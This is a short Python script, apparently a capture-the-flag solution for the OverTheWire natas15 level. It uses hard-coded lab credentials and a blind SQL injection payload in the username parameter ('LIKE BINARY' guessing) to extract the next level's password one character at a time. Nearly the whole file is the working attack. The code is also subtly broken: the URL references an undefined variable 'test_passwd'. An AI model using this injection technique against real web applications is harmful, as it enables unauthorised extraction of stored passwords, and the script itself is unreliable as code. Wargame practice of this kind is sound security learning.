#!/usr/bin/env python

# Chris Lapa
# https://github.com/GusBricker/ctf
# GNU General Public License v2.0

import requests
import time

session = requests.Session()
session.auth = ("natas15","AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J")

LENGTH=32
START_CHAR='0'
END_CHAR='z'
password=""
for i in range(1,LENGTH+1, 1):

    char = START_CHAR
    while char != END_CHAR:
        if str.isalnum(char):
            test_password = password + char
            print test_password
            url="""http://natas15.natas.labs.overthewire.org/index.php?debug&username=natas16" AND password LIKE BINARY "{0}%""".format(test_passwd)
            r = session.get(url)

            if "This user exists." in r.text:
                password += char
                break
        char = chr(ord(char) + 1)
